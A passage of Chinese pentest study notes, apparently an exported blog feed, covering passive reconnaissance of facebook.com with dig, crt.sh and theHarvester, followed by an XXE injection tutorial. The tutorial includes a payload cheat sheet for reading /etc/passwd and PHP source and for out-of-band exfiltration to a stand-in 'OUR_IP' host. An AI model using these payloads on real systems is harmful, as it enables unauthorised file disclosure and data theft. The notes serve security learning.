WHOIS命令行实用程序是我们收集信息的首选工具。然而，我们也可以使用一些在线版本，如 <a href="https://whois.domaintools.com/">whois.domaintools.com</a>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ whois $TARGET</code></pre><p>从这个输出中，我们收集了以下信息：</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="Nslookup-amp-DIG"><a href="#Nslookup-amp-DIG" class="headerlink" title="Nslookup &amp; DIG"></a>Nslookup &amp; DIG</h2><p>我们来看看Nslookup命令行实用程序。让我们假设一位客户要求我们进行外部渗透测试。因此，我们首先需要熟悉它们的基础设施，并确定哪些主机是可以公开访问的。我们可以使用不同类型的DNS请求来找到这一点。使用Nslokup，我们可以在互联网上搜索域名服务器，并向他们询问有关主机和域的信息。尽管该工具有两种模式，交互式和非交互式，但我们将主要关注非交互式模块。 我们只需提交域名就可以查询A记录。但是我们也可以使用-query参数来搜索特定的资源记录。例如：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nslookup $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:Name:facebook.comAddress: 31.13.92.36Name:facebook.comAddress: 2a03:2880:f11c:8083:face:b00c:0:25de</code></pre><p>如果需要，我们还可以通过在命令中添加@&lt;nameserver&#x2F;IP&gt;来指定名称服务器。与nslookup不同，DIG向我们展示了一些更重要的信息。</p><pre><code class="shell-session">Tanin@htb[/htb]$ dig facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58899;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      A;; ANSWER SECTION:facebook.com.           169     IN      A       31.13.92.36;; Query time: 20 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:03:17 CEST 2021;; MSG SIZE  rcvd: 57</code></pre><p>条目以完整的域名开始，包括最后一个点。在必须再次请求信息之前，该条目可以在高速缓存中保持169秒</p><h4 id="Querying-A-Records-for-a-Subdomain"><a href="#Querying-A-Records-for-a-Subdomain" class="headerlink" title="Querying: A Records for a Subdomain"></a>Querying: A Records for a Subdomain</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=www.facebook.comTanin@htb[/htb]$ nslookup -query=A $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:www.facebook.comcanonical name = star-mini.c10r.facebook.com.Name:star-mini.c10r.facebook.comAddress: 31.13.92.36</code></pre><p>Querying: A Records for a Subdomain</p><pre><code class="shell-session">Tanin@htb[/htb]$ dig a www.facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; a www.facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15596;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;www.facebook.com.              IN      A;; ANSWER SECTION:www.facebook.com.       3585    IN      CNAME   star-mini.c10r.facebook.com.star-mini.c10r.facebook.com. 45 IN      A       31.13.92.36;; Query time: 16 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:11:48 CEST 2021;; MSG SIZE  rcvd: 90</code></pre><h4 id="Querying-PTR-Records-for-an-IP-Address"><a href="#Querying-PTR-Records-for-an-IP-Address" class="headerlink" title="Querying: PTR Records for an IP Address"></a>Querying: PTR Records for an IP Address</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nslookup -query=PTR 31.13.92.36Server:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:36.92.13.31.in-addr.arpaname = edge-star-mini-shv-01-frt3.facebook.com.Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig -x 31.13.92.36 @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; -x 31.13.92.36 @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51730;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;36.92.13.31.in-addr.arpa.      IN      PTR;; ANSWER SECTION:36.92.13.31.in-addr.arpa. 1028  IN      PTR     edge-star-mini-shv-01-frt3.facebook.com.;; Query time: 16 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:14:20 CEST 2021;; MSG SIZE  rcvd: 106</code></pre><h4 id="Querying-ANY-Existing-Records"><a href="#Querying-ANY-Existing-Records" class="headerlink" title="Querying: ANY Existing Records"></a>Querying: ANY Existing Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;google.com&quot;Tanin@htb[/htb]$ nslookup -query=ANY $TARGETServer:10.100.0.1Address:10.100.0.1#53Non-authoritative answer:Name:google.comAddress: 172.217.16.142Name:google.comAddress: 2a00:1450:4001:808::200egoogle.comtext = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;google.comtext = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;google.comtext = &quot;v=spf1 include:_spf.google.com ~all&quot;google.comtext = &quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;google.comtext = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;google.comtext = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;google.comtext = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;google.comtext = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;google.comtext = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;google.comnameserver = ns3.google.com.google.comnameserver = ns2.google.com.google.comnameserver = ns1.google.com.google.comnameserver = ns4.google.com.google.commail exchanger = 10 aspmx.l.google.com.google.commail exchanger = 40 alt3.aspmx.l.google.com.google.commail exchanger = 20 alt1.aspmx.l.google.com.google.commail exchanger = 30 alt2.aspmx.l.google.com.google.commail exchanger = 50 alt4.aspmx.l.google.com.google.com    origin = ns1.google.com    mail addr = dns-admin.google.com    serial = 398195569    refresh = 900    retry = 900    expire = 1800    minimum = 60google.comrdata_257 = 0 issue &quot;pki.goog&quot;Authoritative answers can be found from:</code></pre><h4 id="Querying-TXT-Records"><a href="#Querying-TXT-Records" class="headerlink" title="Querying: TXT Records"></a>Querying: TXT Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ nslookup -query=TXT $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:facebook.comtext = &quot;v=spf1 redirect=_spf.facebook.com&quot;facebook.comtext = &quot;google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s&quot;facebook.comtext = &quot;google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY&quot;Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig txt facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; txt facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63771;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      TXT;; ANSWER SECTION:facebook.com.           86400   IN      TXT     &quot;v=spf1 redirect=_spf.facebook.com&quot;facebook.com.           7200    IN      TXT     &quot;google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s&quot;facebook.com.           7200    IN      TXT     &quot;google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY&quot;;; Query time: 24 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:17:46 CEST 2021;; MSG SIZE  rcvd: 249</code></pre><h4 id="Querying-MX-Records"><a href="#Querying-MX-Records" class="headerlink" title="Querying: MX Records"></a>Querying: MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ nslookup -query=MX $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:facebook.commail exchanger = 10 smtpin.vvv.facebook.com.Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; mx facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9392;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      MX;; ANSWER SECTION:facebook.com.           3600    IN      MX      10 smtpin.vvv.facebook.com.;; Query time: 40 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:18:22 CEST 2021;; MSG SIZE  rcvd: 68</code></pre><h1 id="Passive-Subdomain-Enumeration"><a href="#Passive-Subdomain-Enumeration" class="headerlink" title="Passive Subdomain Enumeration"></a>Passive Subdomain Enumeration</h1><h2 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h2><p>VirusTotal维护其DNS复制服务，该服务是通过保留用户访问其提供的URL时所做的DNS解析来开发的。要接收有关域的信息，请在搜索栏中键入域名，然后单击“关系”选项卡。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181654870.png" alt="image"></p><h2 id="Certificates"><a href="#Certificates" class="headerlink" title="Certificates"></a>Certificates</h2><p>我们可以用来提取子域的另一个有趣的信息来源是SSL&#x2F;TLS证书。主要原因是证书透明度（CT），该项目要求证书颁发机构（CA）颁发的每个SSL&#x2F;TLS证书都发布在可公开访问的日志中。 我们将学习如何使用两种主要资源检查CT日志，以发现目标组织的其他域名和子域： </p><p><a href="https://censys.io/">https://censys.io</a> </p><p><a href="https://crt.sh/">https://crt.sh</a> </p><p>我们可以导航到<a href="https://search.censys.io/certificates%E6%88%96https://crt.sh%E5%B9%B6%E4%BB%8B%E7%BB%8D%E6%88%91%E4%BB%AC%E7%9B%AE%E6%A0%87%E7%BB%84%E7%BB%87%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%BC%80%E5%A7%8B%E5%8F%91%E7%8E%B0%E6%96%B0%E7%9A%84%E5%AD%90%E5%9F%9F%E3%80%82">https://search.censys.io/certificates或https://crt.sh并介绍我们目标组织的域名，开始发现新的子域。</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181659020.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181659612.png" alt="img"></p><p>尽管该网站非常优秀，但我们希望将这些信息组织起来，并能够将其与整个信息收集过程中发现的其他来源相结合。让我们向目标网站执行一个curl请求，请求JSON输出，因为这对我们来说更易于处理。我们可以通过以下命令执行此操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ curl -s &quot;https://crt.sh/?q=$&#123;TARGET&#125;&amp;output=json&quot; | jq -r &#39;.[] | &quot;\(.name_value)\n\(.common_name)&quot;&#39; | sort -u &gt; &quot;$&#123;TARGET&#125;_crt.sh.txt&quot;</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ head -n20 facebook.com_crt.sh.txt*.adtools.facebook.com*.ak.facebook.com*.ak.fbcdn.net*.alpha.facebook.com*.assistant.facebook.com*.beta.facebook.com*.channel.facebook.com*.cinyour.facebook.com*.cinyourrc.facebook.com*.connect.facebook.com*.cstools.facebook.com*.ctscan.facebook.com*.dev.facebook.com*.dns.facebook.com*.extern.facebook.com*.extools.facebook.com*.f--facebook.com*.facebook.com*.facebookcorewwwi.onion*.facebookmail.com</code></pre><table><thead><tr><th><code>curl -s</code></th><th>Issue the request with minimal output.</th></tr></thead><tbody><tr><td><code>https://crt.sh/?q=&lt;DOMAIN&gt;&amp;output=json</code></td><td>Ask for the json output.</td></tr><tr><td><code>jq -r &#39;.[]&#39; &quot;\(.name_value)\n\(.common_name)&quot;&#39;</code></td><td>Process the json output and print certificate’s name value and common name one per line.</td></tr><tr><td><code>sort -u</code></td><td>Sort alphabetically the output provided and removes duplicates.</td></tr></tbody></table><p>我们还可以通过以下方式使用OpenSSL对目标手动执行此操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ export PORT=&quot;443&quot;Tanin@htb[/htb]$ openssl s_client -ign_eof 2&gt;/dev/null &lt;&lt;&lt;$&#39;HEAD / HTTP/1.0\r\n\r&#39; -connect &quot;$&#123;TARGET&#125;:$&#123;PORT&#125;&quot; | openssl x509 -noout -text -in - | grep &#39;DNS&#39; | sed -e &#39;s|DNS:|\n|g&#39; -e &#39;s|^\*.*||g&#39; | tr -d &#39;,&#39; | sort -u*.facebook.com*.facebook.net*.fbcdn.net*.fbsbx.com*.m.facebook.com*.messenger.com*.xx.fbcdn.net*.xy.fbcdn.net*.xz.fbcdn.netfacebook.commessenger.com</code></pre><h2 id="Automating-Passive-Subdomain-Enumeration"><a href="#Automating-Passive-Subdomain-Enumeration" class="headerlink" title="Automating Passive Subdomain Enumeration"></a>Automating Passive Subdomain Enumeration</h2><p>我们已经学会了如何使用第三方服务从目标组织获取有用的信息，如子域、命名模式、备用TLD、IP范围等，而无需直接与其基础设施交互或依赖自动化工具。现在，我们将学习如何使用工具和以前获得的信息枚举子域。</p><h4 id="TheHarvester"><a href="#TheHarvester" class="headerlink" title="TheHarvester"></a>TheHarvester</h4><p><a href="https://github.com/laramies/theHarvester">TheHarvester</a> </p><p>Harvester是一个简单易用但功能强大且有效的工具，用于早期渗透测试和红队参与。我们可以使用它来收集信息，以帮助识别公司的攻击面。该工具从各种公共数据源收集电子邮件、名称、子域、IP地址和URL，用于被动信息收集。目前，我们将使用以下模块：</p><p>为了实现自动化，我们将创建一个名为sources.txt的文件，其中包含以下内容。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat sources.txtbaidubufferoveruncrtshhackertargetotxprojecdiscoveryrapiddnssublist3rthreatcrowdtrellourlscanvhostvirustotalzoomeye</code></pre><p>创建文件后，我们将执行以下命令从这些来源收集信息。</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ cat sources.txt | while read source; do theHarvester -d &quot;$&#123;TARGET&#125;&quot; -b $source -f &quot;$&#123;source&#125;_$&#123;TARGET&#125;&quot;;done&lt;SNIP&gt;********************************************************************  _   _                                            _             ** | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  ** | __|  _ \ / _ \  / /_/ / _` | &#39;__\ \ / / _ \/ __| __/ _ \ &#39;__| ** | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    **  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    **                                                                 ** theHarvester 4.0.0                                              ** Coded by Christian Martorella                                   ** Edge-Security Research                                          ** cmartorella@edge-security.com                                   **                                                                 ********************************************************************[*] Target: facebook.com[*] Searching Urlscan.[*] ASNS found: 29--------------------AS12578AS13335AS13535AS136023AS14061AS14618AS15169AS15817&lt;SNIP&gt;</code></pre><p>过程结束后，我们可以提取找到的所有子域，并通过以下命令对其进行排序：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat *.json | jq -r &#39;.hosts[]&#39; 2&gt;/dev/null | cut -d&#39;:&#39; -f 1 | sort -u &gt; &quot;$&#123;TARGET&#125;_theHarvester.txt&quot;</code></pre><p>现在我们可以通过以下方式合并所有被动侦察文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat facebook.com_*.txt | sort -u &gt; facebook.com_subdomains_passive.txtTanin@htb[/htb]$ cat facebook.com_subdomains_passive.txt | wc -l11947</code></pre><h1 id="Passive-Infrastructure-Identification"><a href="#Passive-Infrastructure-Identification" class="headerlink" title="Passive Infrastructure Identification"></a>Passive Infrastructure Identification</h1><p><a href="https://www.netcraft.com/">Netcraft</a>甚至可以在不与服务器交互的情况下向我们提供有关服务器的信息，从被动信息收集的角度来看，这是有价值的。我们可以通过访问使用该服务<a href="https://sitereport.netcraft.com并进入目标域./">https://sitereport.netcraft.com并进入目标域。</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181743827.png" alt="img"></p><p>我们需要特别注意使用的最新IP。有时，我们可以在网络服务器被放置在负载均衡器、网络应用程序防火墙或IDS后面之前，从中发现实际的IP地址，从而允许我们在配置允许的情况下直接连接到它。这种技术可能会干扰或改变我们未来的测试活动。</p><h2 id="Wayback-Machine"><a href="#Wayback-Machine" class="headerlink" title="Wayback Machine"></a>Wayback Machine</h2><p>我们可以使用 <a href="http://web.archive.org/">Wayback Machine</a> 访问这些网站的几个版本，以查找在源代码或文件中可能有有趣注释的旧版本，而这些注释不应该存在。此工具可用于在某个时间点查找网站的旧版本。以一个运行WordPress的网站为例。在使用手动方法和自动化工具评估它时，我们可能找不到任何有趣的东西，所以我们使用Wayback Machine搜索它，并找到一个使用特定（现在很脆弱）插件的版本。回到网站的当前版本，我们发现插件没有被正确删除，仍然可以通过wp内容目录访问。然后我们可以利用它在主机上获得远程代码执行和丰厚的奖励。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181746630.png" alt="image"></p><p>我们还可以使用工具waybackurls来检查Wayback Machine保存的URL，并查找特定的关键字。如果我们在主机上正确设置了Go，我们可以按如下方式安装该工具：</p><p> <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ go install github.com/tomnomnom/waybackurls@latest</code></pre><p>要从域中获取带有获取日期的已爬网URL列表，我们可以在命令中添加-dates开关，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ waybackurls -dates https://facebook.com &gt; waybackurls.txtTanin@htb[/htb]$ cat waybackurls.txt2018-05-20T09:46:07Z http://www.facebook.com./2018-05-20T10:07:12Z https://www.facebook.com/2018-05-20T10:18:51Z http://www.facebook.com/#!/pages/Welcome-Baby/143392015698061?ref=tsrobots.txt2018-05-20T10:19:19Z http://www.facebook.com/2018-05-20T16:00:13Z http://facebook.com2018-05-21T22:12:55Z https://www.facebook.com2018-05-22T15:14:09Z http://www.facebook.com2018-05-22T17:34:48Z http://www.facebook.com/#!/Syerah?v=info&amp;ref=profile/robots.txt2018-05-23T11:03:47Z http://www.facebook.com/#!/Bin595</code></pre><p>如果我们想访问特定的资源，我们需要将URL放在搜索菜单中，并导航到创建快照的日期。如前所述，Wayback Machine是一种方便的工具，不应被忽视。它很可能导致我们发现被遗忘的资产、页面等，从而发现缺陷。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Information-Gathering&quot;&gt;&lt;a href=&quot;#Information-Gathering&quot; class=&quot;headerlink&quot; title=&quot;Information Gathering&quot;&gt;&lt;/a&gt;Information Gathering&lt;/h1&gt;&lt;p&gt;信息收集阶段是每次渗透测试的第一步，我们需要在没有目标组织内部信息的情况下模拟外部攻击者。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181613272.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>web attacks-XXE</title>
    <link href="https://taninluv.github.io/2023/09/11/web-attacks-XXE/"/>
    <id>https://taninluv.github.io/2023/09/11/web-attacks-XXE/</id>
    <published>2023-09-11T07:00:57.000Z</published>
    <updated>2023-09-12T13:27:28.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-XXE"><a href="#Intro-to-XXE" class="headerlink" title="Intro to XXE"></a>Intro to XXE</h1><p>XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。</p><span id="more"></span><p>XML文档的一些关键元素，如：</p><table><thead><tr><th>Key</th><th>Definition</th><th>Example</th></tr></thead><tbody><tr><td><code>Tag</code></td><td>The keys of an XML document, usually wrapped with (<code>&lt;</code>&#x2F;<code>&gt;</code>) characters.</td><td><code>&lt;date&gt;</code></td></tr><tr><td><code>Entity</code></td><td>XML variables, usually wrapped with (<code>&amp;</code>&#x2F;<code>;</code>) characters.</td><td><code>&lt;</code></td></tr><tr><td><code>Element</code></td><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td><td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td></tr><tr><td><code>Attribute</code></td><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td><td><code>version=&quot;1.0&quot;</code>&#x2F;<code>encoding=&quot;UTF-8&quot;</code></td></tr><tr><td><code>Declaration</code></td><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td><td><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></td></tr></tbody></table><p>此外，一些字符被用作XML文档结构的一部分，如&lt;、&gt;、&amp;或“。因此，如果我们需要在XML文档中使用它们，我们应该将它们替换为相应的实体引用（例如&amp;lt；、&amp;gt；、&amp;amp；、&amp;quot；）。最后，我们可以在&lt;！–和–&gt;之间的XML文档中编写注释，类似于HTML文档。</p><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><table><thead><tr><th><strong>Code</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost/email.dtd&quot;&gt;</code></td><td>Define External Entity to a URL</td></tr><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td><td>Define External Entity to a file path</td></tr><tr><td><code>&lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</code></td><td>Read PHP source code with base64 encode filter</td></tr><tr><td><code>&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file through a PHP error</td></tr><tr><td><code>&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file OOB exfiltration</td></tr></tbody></table><h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><p>XML文档类型定义（DTD）允许根据预定义的文档结构验证XML文档。预定义的文档结构可以在文档本身或外部文件中定义。下面是我们前面看到的XML文档的DTD示例：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;  &lt;!ELEMENT recipients (to, cc?)&gt;  &lt;!ELEMENT cc (to*)&gt;  &lt;!ELEMENT date (#PCDATA)&gt;  &lt;!ELEMENT time (#PCDATA)&gt;  &lt;!ELEMENT sender (#PCDATA)&gt;  &lt;!ELEMENT to  (#PCDATA)&gt;  &lt;!ELEMENT body (#PCDATA)&gt;]&gt;</code></pre><p>正如我们所看到的，DTD使用element类型声明来声明根电子邮件元素，然后表示其子元素。之后，每个子元素也被声明，其中一些子元素也具有子元素，而其他子元素可能仅包含原始数据（如PCDATA所示）。 上面的DTD可以放在XML文档本身中，就在第一行的XML声明之后。否则，它可以存储在一个外部文件（例如email.dtd）中，然后在XML文档中使用SYSTEM关键字引用，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;email.dtd&quot;&gt;</code></pre><p>也可以通过URL引用DTD，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;http://inlanefreight.com/email.dtd&quot;&gt;</code></pre><p>这与HTML文档定义和引用JavaScript和CSS脚本的方式相对类似。</p><h2 id="XML-Entities"><a href="#XML-Entities" class="headerlink" title="XML Entities"></a>XML Entities</h2><p>我们还可以在XML DTD中定义自定义实体（即XML变量），以允许重构变量并减少重复数据。这可以通过使用ENTITY关键字来完成，该关键字后面跟着实体名称及其值，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><p>一旦我们定义了一个实体，它就可以在XML文档中用&amp;和分号引用；（例如&amp;company；）。每当引用实体时，XML解析器都会将其替换为其值。然而，最有趣的是，我们可以使用SYSTEM关键字引用外部XML实体，该关键字后面跟着外部实体的路径，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;http://localhost/company.txt&quot;&gt;  &lt;!ENTITY signature SYSTEM &quot;file:///var/www/html/signature.txt&quot;&gt;]&gt;</code></pre><p>注意：我们也可以使用PUBLIC关键字而不是SYSTEM来加载外部资源，后者用于公开声明的实体和标准，例如语言代码（lang&#x3D;“en”）。</p><p>这与文档中定义的内部XML实体类似。当我们引用外部实体（例如&amp;signature；）时，解析器会用存储在外部文件中的值（例如signature.txt）替换该实体。当在服务器端解析XML文件时，在SOAP（XML）API或web表单等情况下，实体可以引用存储在后端服务器上的文件，当我们引用该实体时，最终可能会向我们披露该文件。</p><h1 id="Local-File-Disclosure"><a href="#Local-File-Disclosure" class="headerlink" title="Local File Disclosure"></a>Local File Disclosure</h1><p>当web应用程序信任来自用户输入的未过滤的XML数据时，我们可能能够引用外部XMLDTD文档并定义新的自定义XML实体。假设我们可以定义新的实体并将它们显示在网页上。在这种情况下，我们还应该能够定义外部实体，并使它们引用本地文件，当显示本地文件时，该文件应该在后端服务器上向我们显示该文件的内容。 让我们看看如何识别潜在的XXE漏洞，并利用它们从后端服务器读取敏感文件。</p><h2 id="Identifying"><a href="#Identifying" class="headerlink" title="Identifying"></a>Identifying</h2><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121003069.jpeg" alt="xxe_request" style="zoom:150%;" /><p>正如我们所看到的，该表单似乎正在以XML格式将我们的数据发送到web服务器，使其成为潜在的XXE测试目标。假设web应用程序使用过时的XML库，并且它没有对XML输入应用任何过滤器或净化。在这种情况下，我们可能能够利用这种XML表单来读取本地文件。 </p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121004984.jpeg" alt="xxe_response"></p><p>我们看到电子邮件元素的值正在页面上显示给我们。要将外部文件的内容打印到页面上，我们应该注意显示了哪些元素，这样我们就知道要注入哪些元素。在某些情况下，可能不会显示任何元素，我们将在接下来的部分中介绍如何利用这些元素。 目前，我们知道，无论我们在<email></email>元素中放置什么值，都会显示在HTTP响应中。因此，让我们尝试定义一个新的实体，然后将其用作电子邮件元素中的变量，看看它是否被我们定义的值所取代。为此，我们可以使用上一节中学到的内容来定义新的XML实体，并在XML输入的第一行之后添加以下行：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><blockquote><p>注意：在我们的示例中，HTTP请求中的XML输入没有在XML数据本身中声明DTD，也没有在外部引用DTD，所以我们在定义实体之前添加了一个新的DTD。如果DOCTYPE已经在XML请求中声明，我们只需要向其中添加ENTITY元素。</p></blockquote><p>现在，我们应该有一个名为company的新XML实体，我们可以使用&amp;company；来引用它；。因此，与其在电子邮件元素中使用我们的电子邮件，不如让我们尝试使用&amp;company；，看看它是否会被我们定义的值（Inlane Freight）所取代：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121008563.jpeg" alt="new_entity"></p><p>正如我们所看到的，响应确实使用了我们定义的实体（Inlane 